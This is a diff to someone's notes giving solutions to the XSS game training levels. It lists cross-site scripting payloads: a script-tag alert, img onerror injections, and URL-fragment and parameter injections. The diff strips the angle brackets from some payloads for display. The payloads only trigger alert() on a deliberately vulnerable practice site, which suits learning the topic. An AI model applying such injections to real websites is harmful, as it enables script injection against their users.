@@ -18,9 +18,13 @@ Website never worked?
 
 1) Input:<script>alert()</script>
 
-2) Input:<img src = "foo" onerror=alert();>
+2) Input: img src = "foo" onerror=alert();
 
-3) Full URL: https://xss-game.appspot.com/level3/frame#1+".jpg'/> <img src ='foo' onerror=alert();>
+Image source would have <> around it
+
+3) Full URL: https://xss-game.appspot.com/level3/frame#1+".jpg'/> img src ='foo' onerror=alert();
+
+Image source would have <> around it
 
 4) Full URL: https://xss-game.appspot.com/level4/frame?timer=')%3Balert()%3Bvar foo=('
 
